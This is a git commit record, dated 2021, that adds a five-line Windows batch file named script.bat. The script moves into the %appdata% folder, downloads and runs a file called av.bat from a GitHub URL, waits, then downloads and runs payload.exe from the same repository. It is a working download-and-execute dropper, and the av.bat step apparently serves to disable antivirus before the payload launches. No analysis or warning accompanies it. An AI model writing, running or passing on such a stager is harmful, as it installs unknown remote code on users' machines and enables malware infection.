1ce4e00ef3941cc8adddc4fe216a8c321fca99fe
ishanarya24 <91789624+ishanarya24@users.noreply.github.com>
2021-10-06 18:32:36 +0100

    Add files via upload

---
+++ script.bat
@@ -0,0 +1,5 @@
+cd %appdata% && curl -LJO https://github.com/ishanarya24/dc/av.bat
+cmd /c av.bat
+timeout 13
+cd %appdata% && curl -LJO https://github.com/ishanarya24/dc/payload.exe
+cmd /c payload.exe
